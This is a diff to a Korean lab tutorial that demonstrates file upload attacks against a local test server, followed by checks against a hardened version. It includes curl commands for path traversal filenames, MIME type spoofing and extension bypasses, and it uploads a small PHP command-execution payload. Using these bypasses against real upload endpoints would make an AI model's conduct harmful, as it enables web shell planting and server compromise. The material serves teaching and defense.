@@ -43,41 +43,54 @@ curl.exe -F "file=@test.php" http://localhost:5001/upload
 
 ### 공격 2: 경로 탐색 (Path Traversal)
 
-```bash
+```powershell
+# 테스트 파일 생성
+Set-Content -Path test.txt -Value "hello"
+
 # 상위 디렉토리에 파일 생성 시도
-curl.exe -F "file=@test.txt;filename=../../../tmp/evil.txt" \
-     http://localhost:5001/upload
+curl.exe -F "file=@test.txt;filename=../../../tmp/evil.txt" http://localhost:5001/upload
 ```
 
 `../` 를 포함한 파일명으로 업로드 폴더를 탈출하여 임의 경로에 파일을 생성할 수 있습니다.
 
 ### 공격 3: MIME 타입 위조
 
-```bash
+```powershell
 # Content-Type을 image/jpeg로 위장하여 PHP 파일 업로드
-curl.exe -F "file=@test.php;type=image/jpeg" \
-     http://localhost:5001/upload
+curl.exe -F "file=@test.php;type=image/jpeg" http://localhost:5001/upload
 # 결과: Content-Type만 검사하면 우회 가능
 ```
 
 ### 공격 4: 확장자 우회 기법
 
+```powershell
+# 이중 확장자
+Set-Content -Path test.php.jpg -Value '<?php system("whoami"); ?>'
+curl.exe -F "file=@test.php.jpg" http://localhost:5001/upload
+
+# 대소문자 변형
+Rename-Item test.php.jpg test.PhP
+curl.exe -F "file=@test.PhP" http://localhost:5001/upload
 ```
-test.php.jpg       # 이중 확장자
-test.php%00.jpg    # 널 바이트 (구버전 취약점)
-test.PhP           # 대소문자 변형
-.htaccess          # 서버 설정 파일 업로드
-```
+
+**우회 기법 종류:**
+
+| 기법 | 예시 | 설명 |
+|------|------|------|
+| 이중 확장자 | `test.php.jpg` | 서버가 마지막 확장자만 검사하면 우회 |
+| 대소문자 변형 | `test.PhP` | 대소문자 구분 없는 서버에서 우회 |
+| 널 바이트 | `test.php%00.jpg` | 구버전 취약점 |
+| 설정 파일 | `.htaccess` | Apache 서버 설정 변경 |
 
 ## 방어 확인 (안전한 버전)
 
-```bash
+```powershell
 # 위험한 확장자 → 차단됨
 curl.exe -F "file=@test.php" http://localhost:5002/upload
 # 결과: "File type not allowed" (400)
 
 # 정상 파일 → 업로드 성공 (UUID 파일명으로 변환됨)
-echo "hello" > test.txt
+Set-Content -Path test.txt -Value "hello"
 curl.exe -F "file=@test.txt" http://localhost:5002/upload
 # 결과: 업로드 성공, 파일명이 UUID로 변경됨 (예: a1b2c3d4.txt)
 ```
